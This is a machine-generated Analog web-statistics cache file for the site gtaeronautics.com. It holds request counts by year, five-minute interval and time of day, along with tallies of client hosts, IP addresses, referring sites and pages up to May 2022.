x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2022	05	08	05	44
x	FR	2007	12	18	17	05
x	LR	2022	05	06	23	56
x	E7	2022	05	08	05	44
x	SR	1038749
x	S7	1385
x	NC	410094
x	C7	0
x	FL	421598
x	F7	347
x	RR	187
x	R7	0
x	NH	92124
x	H7	284
x	BT	42782494721
x	B7	154076101
1	Rr	28085	2.704	2022
1	Rr	98917	9.523	2021
1	Rr	89380	8.605	2020
1	Rr	80088	7.710	2019
1	Rr	68927	6.636	2018
1	Rr	60168	5.792	2017
1	Rr	73316	7.058	2016
1	Rr	80796	7.778	2015
1	Rr	110773	10.664	2014
1	Rr	65173	6.274	2013
1	Rr	60742	5.848	2012
1	Rr	57015	5.489	2011
1	Rr	22139	2.131	2010
1	Rr	69710	6.711	2009
1	Rr	71820	6.914	2008
1	Rr	1700	0.164	2007
1	*BT	R	110773	2014
5	Rr	0	0.000	2022	05	06	21	20
5	Rr	0	0.000	2022	05	06	21	15
5	Rr	0	0.000	2022	05	06	21	10
5	Rr	1	0.000	2022	05	06	21	05
5	Rr	1	0.000	2022	05	06	21	00
5	Rr	2	0.000	2022	05	06	20	55
5	Rr	1	0.000	2022	05	06	20	50
5	Rr	0	0.000	2022	05	06	20	45
5	Rr	0	0.000	2022	05	06	20	40
5	Rr	0	0.000	2022	05	06	20	35
5	Rr	0	0.000	2022	05	06	20	30
5	Rr	1	0.000	2022	05	06	20	25
5	Rr	0	0.000	2022	05	06	20	20
5	Rr	0	0.000	2022	05	06	20	15
5	Rr	0	0.000	2022	05	06	20	10
5	Rr	0	0.000	2022	05	06	20	05
5	Rr	1	0.000	2022	05	06	20	00
5	Rr	0	0.000	2022	05	06	19	55
5	Rr	4	0.000	2022	05	06	19	50
5	Rr	0	0.000	2022	05	06	19	45
5	Rr	0	0.000	2022	05	06	19	40
5	Rr	0	0.000	2022	05	06	19	35
5	Rr	0	0.000	2022	05	06	19	30
5	Rr	1	0.000	2022	05	06	19	25
5	Rr	1	0.000	2022	05	06	19	20
5	Rr	0	0.000	2022	05	06	19	15
5	Rr	1	0.000	2022	05	06	19	10
5	Rr	1	0.000	2022	05	06	19	05
5	Rr	1	0.000	2022	05	06	19	00
5	Rr	2	0.000	2022	05	06	18	55
5	Rr	0	0.000	2022	05	06	18	50
5	Rr	1	0.000	2022	05	06	18	45
5	Rr	1	0.000	2022	05	06	18	40
5	Rr	0	0.000	2022	05	06	18	35
5	Rr	1	0.000	2022	05	06	18	30
5	Rr	0	0.000	2022	05	06	18	25
5	Rr	0	0.000	2022	05	06	18	20
5	Rr	1	0.000	2022	05	06	18	15
5	Rr	1	0.000	2022	05	06	18	10
5	Rr	1	0.000	2022	05	06	18	05
5	Rr	0	0.000	2022	05	06	18	00
5	Rr	1	0.000	2022	05	06	17	55
5	Rr	1	0.000	2022	05	06	17	50
5	Rr	1	0.000	2022	05	06	17	45
5	Rr	1	0.000	2022	05	06	17	40
5	Rr	0	0.000	2022	05	06	17	35
5	Rr	1	0.000	2022	05	06	17	30
5	Rr	0	0.000	2022	05	06	17	25
5	Rr	0	0.000	2022	05	06	17	20
5	Rr	0	0.000	2022	05	06	17	15
5	Rr	14	0.001	2022	05	06	17	10
5	Rr	0	0.000	2022	05	06	17	05
5	Rr	16	0.002	2022	05	06	17	00
5	Rr	0	0.000	2022	05	06	16	55
5	Rr	0	0.000	2022	05	06	16	50
5	Rr	0	0.000	2022	05	06	16	45
5	Rr	1	0.000	2022	05	06	16	40
5	Rr	1	0.000	2022	05	06	16	35
5	Rr	2	0.000	2022	05	06	16	30
5	Rr	0	0.000	2022	05	06	16	25
5	Rr	1	0.000	2022	05	06	16	20
5	Rr	0	0.000	2022	05	06	16	15
5	Rr	0	0.000	2022	05	06	16	10
5	Rr	1	0.000	2022	05	06	16	05
5	Rr	0	0.000	2022	05	06	16	00
5	Rr	1	0.000	2022	05	06	15	55
5	Rr	0	0.000	2022	05	06	15	50
5	Rr	0	0.000	2022	05	06	15	45
5	Rr	1	0.000	2022	05	06	15	40
5	Rr	0	0.000	2022	05	06	15	35
5	Rr	0	0.000	2022	05	06	15	30
5	Rr	0	0.000	2022	05	06	15	25
5	Rr	0	0.000	2022	05	06	15	20
5	Rr	0	0.000	2022	05	06	15	15
5	Rr	0	0.000	2022	05	06	15	10
5	Rr	0	0.000	2022	05	06	15	05
5	Rr	0	0.000	2022	05	06	15	00
5	Rr	0	0.000	2022	05	06	14	55
5	Rr	1	0.000	2022	05	06	14	50
5	Rr	0	0.000	2022	05	06	14	45
5	Rr	0	0.000	2022	05	06	14	40
5	Rr	1	0.000	2022	05	06	14	35
5	Rr	0	0.000	2022	05	06	14	30
5	Rr	1	0.000	2022	05	06	14	25
5	Rr	0	0.000	2022	05	06	14	20
5	Rr	0	0.000	2022	05	06	14	15
5	Rr	0	0.000	2022	05	06	14	10
5	Rr	0	0.000	2022	05	06	14	05
5	Rr	1	0.000	2022	05	06	14	00
5	Rr	0	0.000	2022	05	06	13	55
5	Rr	0	0.000	2022	05	06	13	50
5	Rr	0	0.000	2022	05	06	13	45
5	Rr	1	0.000	2022	05	06	13	40
5	Rr	1	0.000	2022	05	06	13	35
5	Rr	0	0.000	2022	05	06	13	30
5	Rr	0	0.000	2022	05	06	13	25
5	Rr	0	0.000	2022	05	06	13	20
5	Rr	0	0.000	2022	05	06	13	15
5	Rr	0	0.000	2022	05	06	13	10
5	Rr	0	0.000	2022	05	06	13	05
5	Rr	4	0.000	2022	05	06	13	00
5	Rr	1	0.000	2022	05	06	12	55
5	Rr	1	0.000	2022	05	06	12	50
5	Rr	0	0.000	2022	05	06	12	45
5	Rr	0	0.000	2022	05	06	12	40
5	Rr	0	0.000	2022	05	06	12	35
5	Rr	5	0.000	2022	05	06	12	30
5	Rr	0	0.000	2022	05	06	12	25
5	Rr	1	0.000	2022	05	06	12	20
5	Rr	0	0.000	2022	05	06	12	15
5	Rr	0	0.000	2022	05	06	12	10
5	Rr	0	0.000	2022	05	06	12	05
5	Rr	0	0.000	2022	05	06	12	00
5	Rr	2	0.000	2022	05	06	11	55
5	Rr	1	0.000	2022	05	06	11	50
5	Rr	0	0.000	2022	05	06	11	45
5	Rr	0	0.000	2022	05	06	11	40
5	Rr	1	0.000	2022	05	06	11	35
5	Rr	22	0.002	2022	05	06	11	30
5	Rr	0	0.000	2022	05	06	11	25
5	Rr	0	0.000	2022	05	06	11	20
5	Rr	0	0.000	2022	05	06	11	15
5	Rr	1	0.000	2022	05	06	11	10
5	Rr	0	0.000	2022	05	06	11	05
5	Rr	0	0.000	2022	05	06	11	00
5	Rr	0	0.000	2022	05	06	10	55
5	Rr	1	0.000	2022	05	06	10	50
5	Rr	0	0.000	2022	05	06	10	45
5	Rr	0	0.000	2022	05	06	10	40
5	Rr	0	0.000	2022	05	06	10	35
5	Rr	0	0.000	2022	05	06	10	30
5	Rr	0	0.000	2022	05	06	10	25
5	Rr	0	0.000	2022	05	06	10	20
5	Rr	0	0.000	2022	05	06	10	15
5	Rr	0	0.000	2022	05	06	10	10
5	Rr	0	0.000	2022	05	06	10	05
5	Rr	0	0.000	2022	05	06	10	00
5	Rr	1	0.000	2022	05	06	09	55
5	Rr	0	0.000	2022	05	06	09	50
5	Rr	0	0.000	2022	05	06	09	45
5	Rr	0	0.000	2022	05	06	09	40
5	Rr	1	0.000	2022	05	06	09	35
5	Rr	2	0.000	2022	05	06	09	30
5	Rr	0	0.000	2022	05	06	09	25
5	Rr	0	0.000	2022	05	06	09	20
5	Rr	5	0.000	2022	05	06	09	15
5	Rr	2	0.000	2022	05	06	09	10
5	Rr	1	0.000	2022	05	06	09	05
5	Rr	0	0.000	2022	05	06	09	00
5	Rr	0	0.000	2022	05	06	08	55
5	Rr	1	0.000	2022	05	06	08	50
5	Rr	0	0.000	2022	05	06	08	45
5	Rr	0	0.000	2022	05	06	08	40
5	Rr	2	0.000	2022	05	06	08	35
5	Rr	0	0.000	2022	05	06	08	30
5	Rr	0	0.000	2022	05	06	08	25
5	Rr	0	0.000	2022	05	06	08	20
5	Rr	0	0.000	2022	05	06	08	15
5	Rr	0	0.000	2022	05	06	08	10
5	Rr	1	0.000	2022	05	06	08	05
5	Rr	1	0.000	2022	05	06	08	00
5	Rr	0	0.000	2022	05	06	07	55
5	Rr	0	0.000	2022	05	06	07	50
5	Rr	0	0.000	2022	05	06	07	45
5	Rr	0	0.000	2022	05	06	07	40
5	Rr	0	0.000	2022	05	06	07	35
5	Rr	0	0.000	2022	05	06	07	30
5	Rr	1	0.000	2022	05	06	07	25
5	Rr	0	0.000	2022	05	06	07	20
5	Rr	0	0.000	2022	05	06	07	15
5	Rr	0	0.000	2022	05	06	07	10
5	Rr	1	0.000	2022	05	06	07	05
5	Rr	0	0.000	2022	05	06	07	00
5	Rr	0	0.000	2022	05	06	06	55
5	Rr	0	0.000	2022	05	06	06	50
5	Rr	0	0.000	2022	05	06	06	45
5	Rr	1	0.000	2022	05	06	06	40
5	Rr	0	0.000	2022	05	06	06	35
5	Rr	0	0.000	2022	05	06	06	30
5	Rr	0	0.000	2022	05	06	06	25
5	Rr	0	0.000	2022	05	06	06	20
5	Rr	0	0.000	2022	05	06	06	15
5	Rr	0	0.000	2022	05	06	06	10
5	Rr	1	0.000	2022	05	06	06	05
5	Rr	0	0.000	2022	05	06	06	00
5	Rr	1	0.000	2022	05	06	05	55
5	Rr	1	0.000	2022	05	06	05	50
5	Rr	1	0.000	2022	05	06	05	45
5	Rr	0	0.000	2022	05	06	05	40
5	Rr	0	0.000	2022	05	06	05	35
5	Rr	0	0.000	2022	05	06	05	30
5	Rr	20	0.002	2022	05	06	05	25
5	Rr	0	0.000	2022	05	06	05	20
5	Rr	0	0.000	2022	05	06	05	15
5	Rr	0	0.000	2022	05	06	05	10
5	Rr	1	0.000	2022	05	06	05	05
5	Rr	1	0.000	2022	05	06	05	00
5	Rr	0	0.000	2022	05	06	04	55
5	Rr	1	0.000	2022	05	06	04	50
5	Rr	1	0.000	2022	05	06	04	45
5	Rr	0	0.000	2022	05	06	04	40
5	Rr	1	0.000	2022	05	06	04	35
5	Rr	0	0.000	2022	05	06	04	30
5	Rr	21	0.002	2022	05	06	04	25
5	Rr	0	0.000	2022	05	06	04	20
5	Rr	0	0.000	2022	05	06	04	15
5	Rr	2	0.000	2022	05	06	04	10
5	Rr	1	0.000	2022	05	06	04	05
5	Rr	0	0.000	2022	05	06	04	00
5	Rr	1	0.000	2022	05	06	03	55
5	Rr	0	0.000	2022	05	06	03	50
5	Rr	0	0.000	2022	05	06	03	45
5	Rr	1	0.000	2022	05	06	03	40
5	Rr	0	0.000	2022	05	06	03	35
5	Rr	1	0.000	2022	05	06	03	30
5	Rr	0	0.000	2022	05	06	03	25
5	Rr	0	0.000	2022	05	06	03	20
5	Rr	0	0.000	2022	05	06	03	15
5	Rr	0	0.000	2022	05	06	03	10
5	Rr	2	0.000	2022	05	06	03	05
5	Rr	0	0.000	2022	05	06	03	00
5	Rr	1	0.000	2022	05	06	02	55
5	Rr	0	0.000	2022	05	06	02	50
5	Rr	1	0.000	2022	05	06	02	45
5	Rr	1	0.000	2022	05	06	02	40
5	Rr	2	0.000	2022	05	06	02	35
5	Rr	0	0.000	2022	05	06	02	30
5	Rr	0	0.000	2022	05	06	02	25
5	Rr	1	0.000	2022	05	06	02	20
5	Rr	0	0.000	2022	05	06	02	15
5	Rr	2	0.000	2022	05	06	02	10
5	Rr	0	0.000	2022	05	06	02	05
5	Rr	0	0.000	2022	05	06	02	00
5	Rr	1	0.000	2022	05	06	01	55
5	Rr	0	0.000	2022	05	06	01	50
5	Rr	0	0.000	2022	05	06	01	45
5	Rr	1	0.000	2022	05	06	01	40
5	Rr	2	0.000	2022	05	06	01	35
5	Rr	0	0.000	2022	05	06	01	30
5	Rr	0	0.000	2022	05	06	01	25
5	Rr	0	0.000	2022	05	06	01	20
5	Rr	0	0.000	2022	05	06	01	15
5	Rr	1	0.000	2022	05	06	01	10
5	Rr	0	0.000	2022	05	06	01	05
5	Rr	0	0.000	2022	05	06	01	00
5	Rr	0	0.000	2022	05	06	00	55
5	Rr	0	0.000	2022	05	06	00	50
5	Rr	0	0.000	2022	05	06	00	45
5	Rr	0	0.000	2022	05	06	00	40
5	Rr	0	0.000	2022	05	06	00	35
5	Rr	29	0.003	2022	05	06	00	30
5	Rr	0	0.000	2022	05	06	00	25
5	Rr	0	0.000	2022	05	06	00	20
5	Rr	0	0.000	2022	05	06	00	15
5	Rr	0	0.000	2022	05	06	00	10
5	Rr	1	0.000	2022	05	06	00	05
5	Rr	4	0.000	2022	05	06	00	00
5	*BT	R	715	2020	12	11	23	20
7	Rr	3095	0.298	00	00
7	Rr	3657	0.352	00	05
7	Rr	3264	0.314	00	10
7	Rr	2834	0.273	00	15
7	Rr	3424	0.330	00	20
7	Rr	3846	0.370	00	25
7	Rr	3354	0.323	00	30
7	Rr	3304	0.318	00	35
7	Rr	3446	0.332	00	40
7	Rr	3528	0.340	00	45
7	Rr	3664	0.353	00	50
7	Rr	3222	0.310	00	55
7	Rr	3008	0.290	01	00
7	Rr	3346	0.322	01	05
7	Rr	3423	0.330	01	10
7	Rr	3338	0.321	01	15
7	Rr	3477	0.335	01	20
7	Rr	3147	0.303	01	25
7	Rr	3203	0.308	01	30
7	Rr	3434	0.331	01	35
7	Rr	3432	0.330	01	40
7	Rr	3276	0.315	01	45
7	Rr	3101	0.299	01	50
7	Rr	3467	0.334	01	55
7	Rr	3172	0.305	02	00
7	Rr	3269	0.315	02	05
7	Rr	3160	0.304	02	10
7	Rr	3710	0.357	02	15
7	Rr	3439	0.331	02	20
7	Rr	3457	0.333	02	25
7	Rr	3377	0.325	02	30
7	Rr	3611	0.348	02	35
7	Rr	3342	0.322	02	40
7	Rr	3270	0.315	02	45
7	Rr	3032	0.292	02	50
7	Rr	3644	0.351	02	55
7	Rr	3327	0.320	03	00
7	Rr	3100	0.298	03	05
7	Rr	3126	0.301	03	10
7	Rr	3385	0.326	03	15
7	Rr	3094	0.298	03	20
7	Rr	3007	0.289	03	25
7	Rr	3124	0.301	03	30
7	Rr	3346	0.322	03	35
7	Rr	3336	0.321	03	40
7	Rr	3625	0.349	03	45
7	Rr	4263	0.410	03	50
7	Rr	3413	0.329	03	55
7	Rr	3153	0.304	04	00
7	Rr	3190	0.307	04	05
7	Rr	3404	0.328	04	10
7	Rr	3432	0.330	04	15
7	Rr	3570	0.344	04	20
7	Rr	3277	0.315	04	25
7	Rr	3254	0.313	04	30
7	Rr	2985	0.287	04	35
7	Rr	2983	0.287	04	40
7	Rr	3488	0.336	04	45
7	Rr	3035	0.292	04	50
7	Rr	3113	0.300	04	55
7	Rr	2845	0.274	05	00
7	Rr	2774	0.267	05	05
7	Rr	3302	0.318	05	10
7	Rr	3202	0.308	05	15
7	Rr	3388	0.326	05	20
7	Rr	3220	0.310	05	25
7	Rr	3370	0.324	05	30
7	Rr	3196	0.308	05	35
7	Rr	2888	0.278	05	40
7	Rr	2914	0.281	05	45
7	Rr	2829	0.272	05	50
7	Rr	3050	0.294	05	55
7	Rr	3004	0.289	06	00
7	Rr	3665	0.353	06	05
7	Rr	3176	0.306	06	10
7	Rr	3096	0.298	06	15
7	Rr	2887	0.278	06	20
7	Rr	2952	0.284	06	25
7	Rr	2927	0.282	06	30
7	Rr	3001	0.289	06	35
7	Rr	3119	0.300	06	40
7	Rr	3225	0.310	06	45
7	Rr	2621	0.252	06	50
7	Rr	2602	0.250	06	55
7	Rr	3186	0.307	07	00
7	Rr	2812	0.271	07	05
7	Rr	2865	0.276	07	10
7	Rr	2751	0.265	07	15
7	Rr	3072	0.296	07	20
7	Rr	3399	0.327	07	25
7	Rr	3398	0.327	07	30
7	Rr	3073	0.296	07	35
7	Rr	2745	0.264	07	40
7	Rr	2800	0.270	07	45
7	Rr	2653	0.255	07	50
7	Rr	2769	0.267	07	55
7	Rr	2869	0.276	08	00
7	Rr	3116	0.300	08	05
7	Rr	2895	0.279	08	10
7	Rr	2757	0.265	08	15
7	Rr	2831	0.273	08	20
7	Rr	2868	0.276	08	25
7	Rr	3289	0.317	08	30
7	Rr	2909	0.280	08	35
7	Rr	2802	0.270	08	40
7	Rr	2669	0.257	08	45
7	Rr	2655	0.256	08	50
7	Rr	2671	0.257	08	55
7	Rr	2659	0.256	09	00
7	Rr	2955	0.284	09	05
7	Rr	2755	0.265	09	10
7	Rr	2610	0.251	09	15
7	Rr	3014	0.290	09	20
7	Rr	2778	0.267	09	25
7	Rr	2794	0.269	09	30
7	Rr	2565	0.247	09	35
7	Rr	2809	0.270	09	40
7	Rr	2797	0.269	09	45
7	Rr	2458	0.237	09	50
7	Rr	2747	0.264	09	55
7	Rr	2644	0.255	10	00
7	Rr	2522	0.243	10	05
7	Rr	2724	0.262	10	10
7	Rr	2561	0.247	10	15
7	Rr	2469	0.238	10	20
7	Rr	2916	0.281	10	25
7	Rr	2644	0.255	10	30
7	Rr	2658	0.256	10	35
7	Rr	2794	0.269	10	40
7	Rr	2642	0.254	10	45
7	Rr	3365	0.324	10	50
7	Rr	3195	0.308	10	55
7	Rr	4141	0.399	11	00
7	Rr	3097	0.298	11	05
7	Rr	2962	0.285	11	10
7	Rr	2902	0.279	11	15
7	Rr	2970	0.286	11	20
7	Rr	2776	0.267	11	25
7	Rr	3152	0.303	11	30
7	Rr	2812	0.271	11	35
7	Rr	2977	0.287	11	40
7	Rr	2989	0.288	11	45
7	Rr	2949	0.284	11	50
7	Rr	3025	0.291	11	55
7	Rr	3571	0.344	12	00
7	Rr	3239	0.312	12	05
7	Rr	3286	0.316	12	10
7	Rr	2813	0.271	12	15
7	Rr	2998	0.289	12	20
7	Rr	2940	0.283	12	25
7	Rr	2979	0.287	12	30
7	Rr	2805	0.270	12	35
7	Rr	3068	0.295	12	40
7	Rr	3173	0.305	12	45
7	Rr	2864	0.276	12	50
7	Rr	3004	0.289	12	55
7	Rr	3059	0.294	13	00
7	Rr	3080	0.297	13	05
7	Rr	3407	0.328	13	10
7	Rr	3115	0.300	13	15
7	Rr	3062	0.295	13	20
7	Rr	3256	0.313	13	25
7	Rr	3294	0.317	13	30
7	Rr	3682	0.354	13	35
7	Rr	3136	0.302	13	40
7	Rr	2847	0.274	13	45
7	Rr	3432	0.330	13	50
7	Rr	3349	0.322	13	55
7	Rr	3471	0.334	14	00
7	Rr	3689	0.355	14	05
7	Rr	3796	0.365	14	10
7	Rr	3966	0.382	14	15
7	Rr	3737	0.360	14	20
7	Rr	3809	0.367	14	25
7	Rr	4056	0.390	14	30
7	Rr	3845	0.370	14	35
7	Rr	3522	0.339	14	40
7	Rr	3674	0.354	14	45
7	Rr	3696	0.356	14	50
7	Rr	4098	0.395	14	55
7	Rr	4265	0.411	15	00
7	Rr	4399	0.423	15	05
7	Rr	3920	0.377	15	10
7	Rr	4022	0.387	15	15
7	Rr	3807	0.366	15	20
7	Rr	4252	0.409	15	25
7	Rr	4600	0.443	15	30
7	Rr	4022	0.387	15	35
7	Rr	4393	0.423	15	40
7	Rr	4372	0.421	15	45
7	Rr	4393	0.423	15	50
7	Rr	4711	0.454	15	55
7	Rr	4500	0.433	16	00
7	Rr	4665	0.449	16	05
7	Rr	4441	0.428	16	10
7	Rr	4863	0.468	16	15
7	Rr	4529	0.436	16	20
7	Rr	4150	0.400	16	25
7	Rr	4566	0.440	16	30
7	Rr	4780	0.460	16	35
7	Rr	4645	0.447	16	40
7	Rr	4729	0.455	16	45
7	Rr	4731	0.455	16	50
7	Rr	4554	0.438	16	55
7	Rr	4661	0.449	17	00
7	Rr	4555	0.439	17	05
7	Rr	4894	0.471	17	10
7	Rr	4463	0.430	17	15
7	Rr	4559	0.439	17	20
7	Rr	4621	0.445	17	25
7	Rr	4731	0.455	17	30
7	Rr	4746	0.457	17	35
7	Rr	4612	0.444	17	40
7	Rr	4689	0.451	17	45
7	Rr	4534	0.436	17	50
7	Rr	4481	0.431	17	55
7	Rr	4097	0.394	18	00
7	Rr	4450	0.428	18	05
7	Rr	5146	0.495	18	10
7	Rr	4828	0.465	18	15
7	Rr	4454	0.429	18	20
7	Rr	4901	0.472	18	25
7	Rr	4612	0.444	18	30
7	Rr	4780	0.460	18	35
7	Rr	4748	0.457	18	40
7	Rr	4730	0.455	18	45
7	Rr	4733	0.456	18	50
7	Rr	4890	0.471	18	55
7	Rr	5209	0.501	19	00
7	Rr	4899	0.472	19	05
7	Rr	4805	0.463	19	10
7	Rr	4493	0.433	19	15
7	Rr	4540	0.437	19	20
7	Rr	4315	0.415	19	25
7	Rr	4333	0.417	19	30
7	Rr	4586	0.441	19	35
7	Rr	4745	0.457	19	40
7	Rr	4868	0.469	19	45
7	Rr	4333	0.417	19	50
7	Rr	4468	0.430	19	55
7	Rr	4389	0.423	20	00
7	Rr	5003	0.482	20	05
7	Rr	4790	0.461	20	10
7	Rr	4449	0.428	20	15
7	Rr	4717	0.454	20	20
7	Rr	4531	0.436	20	25
7	Rr	4111	0.396	20	30
7	Rr	4279	0.412	20	35
7	Rr	4627	0.445	20	40
7	Rr	4863	0.468	20	45
7	Rr	4391	0.423	20	50
7	Rr	4627	0.445	20	55
7	Rr	5068	0.488	21	00
7	Rr	4335	0.417	21	05
7	Rr	4450	0.428	21	10
7	Rr	4340	0.418	21	15
7	Rr	3852	0.371	21	20
7	Rr	4538	0.437	21	25
7	Rr	3958	0.381	21	30
7	Rr	4214	0.406	21	35
7	Rr	4201	0.404	21	40
7	Rr	4253	0.409	21	45
7	Rr	4496	0.433	21	50
7	Rr	3943	0.380	21	55
7	Rr	4013	0.386	22	00
7	Rr	3847	0.370	22	05
7	Rr	4067	0.392	22	10
7	Rr	3626	0.349	22	15
7	Rr	4160	0.400	22	20
7	Rr	4214	0.406	22	25
7	Rr	3800	0.366	22	30
7	Rr	4220	0.406	22	35
7	Rr	3801	0.366	22	40
7	Rr	3763	0.362	22	45
7	Rr	3965	0.382	22	50
7	Rr	3717	0.358	22	55
7	Rr	4174	0.402	23	00
7	Rr	3863	0.372	23	05
7	Rr	3819	0.368	23	10
7	Rr	3771	0.363	23	15
7	Rr	4564	0.439	23	20
7	Rr	3661	0.352	23	25
7	Rr	3462	0.333	23	30
7	Rr	3786	0.364	23	35
7	Rr	3474	0.334	23	40
7	Rr	3447	0.332	23	45
7	Rr	3501	0.337	23	50
7	Rr	3236	0.312	23	55
o	*f	0R	r
o	lRQ	1	1038749	2895369463	[unresolved numerical addresses]
Z	*f	-20R	r
Z	lRb	1	43996	2.874	66.249
Z	lRb	1	40552	1.705	69
Z	lRb	1	29142	2.074	35
Z	lRb	1	25047	0.833	46
Z	lRb	1	22911	2.838	157.55
Z	lRb	1	22233	3.460	70
Z	lRb	1	20452	1.501	34
Z	lRb	1	17885	2.256	207.46
Z	lRb	1	17873	2.047	54
Z	lRb	1	16983	2.524	40
Z	lRb	1	15677	1.341	76
Z	lRb	1	13595	1.543	72
Z	lRb	1	12416	1.213	5
Z	lRb	1	12180	1.116	75
Z	lRb	1	12111	0.091	178.137
Z	lRb	1	11683	1.050	123
Z	lRb	1	10957	0.830	74
Z	lRb	1	10125	0.663	71
Z	lRb	1	9790	1.075	104
Z	lRb	1	9231	0.506	37
Z	lRb	1	663910	68.459	[not listed: 8755]
S	*f	-50P	r
S	Rb	4702	0.395	14.33.246.211
S	Rb	3866	0.796	192.234.235.103
S	Rb	3248	0.247	192.99.15.146
S	Rb	2341	0.137	100.43.83.148
S	Rb	1992	0.069	66.249.75.109
S	Rb	1829	0.149	37.59.14.116
S	Rb	1781	0.216	75.98.173.33
S	Rb	1597	0.131	78.155.138.20
S	Rb	1543	0.074	199.21.99.79
S	Rb	1459	0.010	92.249.127.111
S	Rb	1330	0.018	109.102.111.58
S	Rb	1312	0.045	205.203.134.197
S	Rb	1304	0.193	5.196.13.127
S	Rb	1276	0.120	208.115.113.82
S	Rb	1270	0.065	95.108.248.29
S	Rb	1266	0.042	49.7.20.102
S	Rb	1155	0.233	75.98.173.84
S	Rb	1144	0.208	79.125.27.96
S	Rb	1142	0.001	91.207.9.226
S	Rb	1107	0.016	66.249.69.97
S	Rb	1081	0.019	66.249.69.81
S	Rb	1076	0.019	49.7.20.111
S	Rb	1051	0.032	66.249.69.192
S	Rb	1047	0.017	106.38.241.144
S	Rb	1039	0.015	66.249.69.89
S	Rb	1030	0.098	5.255.250.90
S	Rb	1024	0.074	95.108.150.235
S	Rb	1012	0.082	192.99.6.132
S	Rb	957	0.183	199.21.99.197
S	Rb	951	0.062	66.249.73.133
S	Rb	925	0.038	144.76.27.118
S	Rb	839	0.119	216.244.66.229
S	Rb	815	0.030	178.63.23.80
S	Rb	812	0.094	66.249.64.90
S	Rb	808	0.183	149.202.211.239
S	Rb	791	0.065	192.99.7.55
S	Rb	786	0.117	66.11.128.152
S	Rb	777	0.001	193.150.120.14
S	Rb	760	0.051	208.115.113.92
S	Rb	744	0.010	109.102.111.20
S	Rb	739	0.010	109.102.111.50
S	Rb	721	0.004	106.38.241.177
S	Rb	704	0.001	109.120.157.179
S	Rb	698	0.025	220.181.125.162
S	Rb	694	0.039	78.155.138.30
S	Rb	686	0.020	66.249.65.212
S	Rb	670	0.044	49.7.20.108
S	Rb	664	0.054	94.23.59.173
S	Rb	653	0.073	52.21.132.215
S	Rb	649	0.053	46.105.74.59
S	Rb	976882	95.203	[not listed: 92074]
s	*FR	2013	12	18	21	53
s	*LR	2022	05	06	17	12
s	*f	-20R	s
s	lRS	1	213149	527	http://www.gtaeronautics.com/
s	lRS	1	51501	77	http://gtaeronautics.com/
s	lRS	1	5188	9	https://www.google.com/
s	lRS	1	261	1	https://www.bing.com/
s	lRS	1	1553	0	http://www.google.com/
s	lRS	1	1246	0	http://www.baidu.com/
s	lRS	1	1159	0	http://www.trainingindustry.com/
s	lRS	1	609	0	http://www.mfgpages.com/
s	lRS	1	604	0	http://www.openfos.com/
s	lRS	1	517	0	http://www.topicway.com/
s	lRS	1	462	0	http://anti-crisis-seo.com/
s	lRS	1	395	0	http://uptime.com/
s	lRS	1	362	0	http://semalt.semalt.com/
s	lRS	1	327	0	http://www.bing.com/
s	lRS	1	301	0	http://chimiver.info/
s	lRS	1	280	0	https://www.thomasnet.com/
s	lRS	1	280	0	https://www.google.co.in/
s	lRS	1	262	0	http://google.co.jp/
s	lRS	1	236	0	http://www.thomasnet.com/
s	lRS	1	234	0	http://www.artparquet.ru/
s	lRS	1	48744	2	[not listed: 4345]
f	*FR	2013	12	18	21	53
f	*LR	2022	05	06	17	12
f	*f	-30R	s
f	lRS	1	145363	468	http://www.gtaeronautics.com/
f	lRS	1	35336	49	http://gtaeronautics.com/
f	lRS	1	9981	22	http://www.gtaeronautics.com/aboutus.html
f	lRS	1	6108	8	http://www.gtaeronautics.com/UASFC.html
f	lRS	1	4782	8	https://www.google.com/
f	lRS	1	1538	7	http://gtaeronautics.com/aboutus.html
f	lRS	1	7144	6	http://www.gtaeronautics.com/CCT&M.html
f	lRS	1	1656	6	http://www.gtaeronautics.com/IndNews.html
f	lRS	1	1092	3	http://gtaeronautics.com/index.html
f	lRS	1	5624	2	http://gtaeronautics.com/IndNews.html
f	lRS	1	2587	2	http://www.gtaeronautics.com/GT380 RPAS.html
f	lRS	1	2032	2	http://www.gtaeronautics.com/RD.html
f	lRS	1	1454	2	http://www.gtaeronautics.com/contactus.html
f	lRS	1	1132	1	http://www.gtaeronautics.com/links.html
f	lRS	1	4550	0	http://www.gtaeronautics.com/index.html
f	lRS	1	4365	0	http://www.gtaeronautics.com/ConsultingA.html
f	lRS	1	2557	0	http://www.gtaeronautics.com/pna.html
f	lRS	1	2301	0	http://www.gtaeronautics.com/GT1500 RPAS.html
f	lRS	1	2167	0	http://www.gtaeronautics.com/CompNews.html
